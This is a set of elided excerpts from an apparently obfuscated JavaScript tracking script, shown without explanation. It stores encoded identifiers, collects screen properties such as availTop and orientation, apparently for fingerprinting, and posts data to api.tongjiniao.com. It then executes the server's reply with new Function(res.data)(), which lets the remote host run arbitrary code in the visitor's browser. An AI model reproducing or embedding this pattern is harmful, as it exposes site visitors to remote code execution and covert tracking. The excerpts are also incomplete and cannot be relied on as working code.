...
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tpmJlpbGmTaW.XZZNllW6UZ2dcU9GGb2KbYlmtW5yWmGaUlGptcZluYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2dpl2VplZVlnmmXZmJlmGhuZw==');
...
this.request.post('//api.tongjiniao.com/r?t=1741044979&p=755331149542236160', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
    ...
    if (!v) {
        v = 'bmyZl5aTZppqbmxlZJlqYmplkmVsbGlqYGVjkZI='
    }
...
sid: function (k, v) {
    ...
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxrY5ZobWdol2KYaGZmkQ=='
    }
